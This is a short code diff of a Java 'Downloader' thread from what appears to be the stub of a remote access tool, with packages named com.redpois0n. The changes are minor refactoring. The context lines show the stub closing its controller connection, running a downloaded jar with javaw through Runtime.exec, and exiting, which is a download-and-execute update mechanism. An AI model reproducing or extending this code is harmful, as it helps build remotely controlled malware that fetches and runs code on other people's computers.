@@ -9,7 +9,7 @@ import java.net.URLConnection;
 import java.util.Random;
 
 import com.redpois0n.common.OperatingSystem;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.stub.packets.outgoing.Header;
 import com.redpois0n.utils.Utils;
 
 public class Downloader extends Thread {
@@ -68,10 +68,10 @@ public class Downloader extends Thread {
 				fout.close();
 
 				if (update) {
-					Connection.write(Header.DISCONNECT);
 					try {
 						Connection.socket.close();
 					} catch (Exception ex) {
+						ex.printStackTrace();
 					}
 					if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 						Runtime.getRuntime().exec(new String[] { System.getProperty("java.home") + "\\bin\\javaw.exe", "-jar", file.getAbsolutePath() });
@@ -86,7 +86,7 @@ public class Downloader extends Thread {
 						}
 
 					} catch (Exception ex) {
-
+						ex.printStackTrace();
 					}
 					Main.running = false;
 					System.exit(0);
